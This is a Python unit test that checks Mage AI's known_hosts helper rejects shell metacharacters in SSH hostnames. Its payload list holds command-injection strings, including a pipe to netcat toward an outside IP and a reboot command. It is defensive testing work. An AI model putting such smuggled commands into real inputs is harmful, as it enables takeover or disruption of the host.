import unittest
from unittest.mock import patch

from mage_ai.data_preparation.git import utils


class AddHostToKnownHostsSecurityTest(unittest.TestCase):
    def setUp(self):
        self.payloads = [
            'ssh://h;touch /tmp/should_not_exist',
            'ssh://h$(id)',
            'ssh://h`id`',
            'ssh://h|nc 1.1.1.1 80',
            'ssh://h&&touch /tmp/x',
            'ssh://;reboot',
        ]

    def test_shell_metacharacters_rejected(self):
        for payload in self.payloads:
            with self.subTest(payload=payload), \
                 patch('subprocess.run') as mock_run, \
                 self.assertRaises(ValueError):
                utils.add_host_to_known_hosts(payload)
            # ssh-keyscan should never be invoked with a poisoned hostname
            mock_run.assert_not_called()

    def test_safe_hostname_accepted(self):
        with patch('subprocess.run') as mock_run, \
             patch('builtins.open'), \
             patch('os.makedirs'):
            result = utils.add_host_to_known_hosts('ssh://git.example.com:22')
            self.assertTrue(result)
            args, kwargs = mock_run.call_args
            # `subprocess.run` is invoked with a list (no shell), and the
            # hostname is passed as a single argv element. `urlparse` strips
            # the port into `.port`, so we expect just the host here.
            self.assertEqual(args[0][0:3], ['ssh-keyscan', '-t', 'rsa'])
            self.assertEqual(args[0][3], 'git.example.com')
            self.assertNotIn('shell', kwargs)  # never run via /bin/sh

    def test_no_scheme_added_automatically(self):
        with patch('subprocess.run') as mock_run, \
             patch('builtins.open'), \
             patch('os.makedirs'):
            result = utils.add_host_to_known_hosts('git.example.com')
            self.assertTrue(result)


if __name__ == '__main__':
    unittest.main()
